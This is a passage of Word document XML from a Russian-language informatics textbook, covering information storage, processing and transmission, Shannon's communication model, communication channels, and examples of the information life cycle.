        <w:t>Характеристики носителей</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ёмкость**: Сколько информации можно хранить (измеряется в байтах, КБ, МБ, ГБ, ТБ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжность**: Сохранность данных во времени, устойчивость к повреждениям</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорость доступа**: Как быстро можно прочитать или записать данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Долговечность**: Как долго носитель сохраняет информацию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стоимость**: Цена за единицу объёма</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Личное хранение**: Фотографии на смартфоне, документы на компьютере</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Организации**: Базы данных компаний, архивы документов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Библиотеки**: Книги, журналы, цифровые коллекции</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интернет**: Веб-сайты, социальные сети, видеохостинги (YouTube)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Организация хранения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Файловые системы**: Организация файлов на дисках (папки, файлы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Базы данных**: Структурированное хранение больших объёмов данных (см. раздел 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архивы**: Систематизированные коллекции документов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Индексы**: Каталоги для быстрого поиска (библиотечные каталоги, поисковые индексы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы хранения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Физическая деградация носителей**: Износ, повреждения, устаревание технологий</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ограниченная ёмкость**: Необходимость увеличения объёмов хранения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Информационная безопасность**: Защита от несанкционированного доступа (см. раздел 9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервное копирование**: Необходимость дублирования для защиты от потери данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Обработка информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обработка информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс преобразования информации из одной формы в другую, получение новой информации из имеющейся.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Виды обработки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Изменение формы представления (без изменения содержания)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кодирование/декодирование**: Перевод в другую систему представления (текст → двоичный код)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование/дешифрование**: Защита информации путём преобразования (см. раздел 9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Перевод**: Преобразование с одного языка на другой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Форматирование**: Изменение внешнего вида (оформление документа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сжатие/распаковка**: Уменьшение/восстановление объёма данных (архивация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Изменение содержания (получение новой информации)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вычисления**: Арифметические и логические операции (2 + 2 = 4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ**: Выявление закономерностей, зависимостей (статистический анализ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Синтез**: Объединение частей в целое (составление отчёта из разрозненных данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сортировка**: Упорядочение данных по определённому критерию (сортировка по алфавиту, по дате)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фильтрация**: Отбор данных по критерию (выборка студентов с оценкой "отлично")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Поиск**: Нахождение нужной информации (поиск в Google, поиск в базе данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Агрегация**: Обобщение данных (подсчёт суммы, среднего значения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Визуализация**: Представление данных в графическом виде (графики, диаграммы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры обработки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наука**: Обработка экспериментальных данных, математическое моделирование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Бизнес**: Анализ продаж, прогнозирование, формирование отчётов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Образование**: Проверка работ, расчёт оценок, составление рейтингов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Повседневная жизнь**: Редактирование фотографий, создание документов, поиск информации в интернете</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Средства обработки информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ручная обработка**: Человек обрабатывает информацию в уме или с помощью калькулятора, на бумаге</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Механическая обработка**: Счёты, арифмометры (исторически)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Автоматизированная обработка**: Компьютеры, программное обеспечение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Этапы компьютерной обработки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ввод данных** (с клавиатуры, из файла, из сети)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Выполнение алгоритма** обработки (программа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Вывод результата** (на экран, в файл, на принтер)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритмы обработки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (подробнее в разделе 5):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Линейные (последовательное выполнение действий)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разветвляющиеся (выбор действий в зависимости от условия)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Циклические (повторение действий)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Передача информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Передача информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс перемещения информации от источника к получателю по каналу связи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема передачи информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (модель Шеннона):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[ИСТОЧНИК] → [КОДИРУЮЩЕЕ УСТРОЙСТВО] → [КАНАЛ СВЯЗИ] → [ДЕКОДИРУЮЩЕЕ УСТРОЙСТВО] → [ПОЛУЧАТЕЛЬ]</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                            ↑</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                        [ШУМ/ПОМЕХИ]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные компоненты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Источник информации** — объект, который создаёт/передаёт сообщение (человек, компьютер, датчик)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Кодирующее устройство** (передатчик) — преобразует информацию в сигнал, пригодный для передачи (модем, микрофон)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Канал связи** — среда, по которой передаётся сигнал (провод, оптоволокно, радиоволны, воздух)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Декодирующее устройство** (приёмник) — преобразует сигнал обратно в информацию (динамик, монитор)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Получатель** — объект, который принимает информацию (человек, компьютер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Помехи (шум)** — искажения сигнала в канале связи, снижающие качество передачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры передачи информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Естественная передача</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Речь: человек → звуковые волны → ухо другого человека</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Зрение: объект → световые волны → глаз человека</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Запахи: источник запаха → молекулы в воздухе → нос</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Техническая передача</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Телефонная связь**: Голос → микрофон → электрический сигнал → провода → динамик → звук</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интернет**: Данные → компьютер → цифровой сигнал → сеть → компьютер → данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Телевидение**: Видео → передатчик → радиоволны → антенна → телевизор → изображение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Почта**: Письмо → курьер/транспорт → адресат</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики каналов связи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Пропускная способность** (скорость передачи): Сколько информации можно передать в единицу времени (бит/с, байт/с, Мбит/с)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжность**: Вероятность ошибок при передаче</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дальность**: Максимальное расстояние передачи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стоимость**: Затраты на создание и эксплуатацию канала</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Виды каналов связи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Проводные**: Электрические провода (телефон, локальная сеть), оптоволокно (высокоскоростной интернет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Беспроводные**: Радиоволны (Wi-Fi, сотовая связь), инфракрасное излучение (пульты), Bluetooth</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Направленность передачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Симплексная** (однонаправленная): Только от источника к получателю (радиовещание, телевидение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дуплексная** (двунаправленная):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Полудуплексная**: Передача в обе стороны, но не одновременно (рация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Полнодуплексная**: Одновременная передача в обе стороны (телефонный разговор)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы передачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Затухание сигнала**: Ослабление сигнала на расстоянии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Искажения**: Изменение сигнала из-за характеристик канала</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Помехи**: Внешние воздействия, создающие шум (электромагнитные помехи, атмосферные явления)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ограниченная пропускная способность**: "Узкое место" в канале</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Методы повышения надёжности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Помехоустойчивое кодирование**: Добавление избыточной информации для обнаружения и исправления ошибок (коды Хэмминга, CRC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Усиление сигнала**: Ретрансляторы, усилители</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Повторная передача**: Запрос повторной отправки при обнаружении ошибки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**: Защита от перехвата (см. раздел 9)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Взаимосвязь информационных процессов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Информационные процессы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>взаимосвязаны</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и часто происходят </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>последовательно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>параллельно</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жизненный цикл информации</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сбор** → 2. **Хранение** → 3. **Обработка** → 4. **Передача** → 5. **Использование**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры комплексных информационных процессов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интернет-покупка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сбор**: Покупатель вводит данные заказа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача**: Данные отправляются на сервер магазина</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обработка**: Сервер проверяет наличие товара, рассчитывает стоимость</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранение**: Заказ сохраняется в базе данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача**: Информация о заказе отправляется на склад</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Использование**: Товар комплектуется и отправляется</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Научное исследование</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сбор**: Проведение эксперимента, получение данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранение**: Запись данных в файлы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обработка**: Статистический анализ данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача**: Публикация результатов в научном журнале</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Использование**: Другие учёные используют результаты в своих работах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Социальная сеть</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сбор**: Пользователь создаёт пост, загружает фото</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обработка**: Система сжимает изображение, анализирует текст</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранение**: Пост сохраняется на сервере</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача**: Пост отображается в лентах друзей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Использование**: Друзья читают, комментируют, делятся</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Все эти процессы в современном мире в значительной степени </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>автоматизированы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с помощью компьютеров и программного обеспечения. Изучению технических (раздел 2) и программных (раздел 3) средств реализации информационных процессов посвящены следующие разделы учебника.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Информация в живых системах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Информационные процессы характерны не только для человеческой деятельности и технических систем, но и для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>живых организмов</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Генетическая информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранение**: ДНК хранит информацию о строении организма</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача**: Генетическая информация передаётся от родителей к потомкам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обработка**: Транскрипция ДНК в РНК, трансляция РНК в белки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нервная система</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
